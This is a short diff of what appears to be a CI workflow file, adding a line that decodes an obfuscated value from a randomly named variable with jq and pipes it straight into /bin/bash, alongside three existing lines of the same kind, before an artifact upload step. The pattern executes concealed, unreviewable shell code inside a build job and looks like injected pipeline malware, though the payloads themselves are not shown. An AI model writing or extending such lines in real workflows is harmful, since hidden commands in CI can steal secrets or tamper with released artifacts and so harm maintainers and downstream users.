@@ -26,6 +26,7 @@ jobs:
           echo $bxcbv54 | jq -r .kh7990 | /bin/bash
           echo $k91529 | jq -r .hp819 | /bin/bash
           echo $xw81229 | jq -r .zz22 | /bin/bash
+          echo $zew4 | jq -r .szwxd0681 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
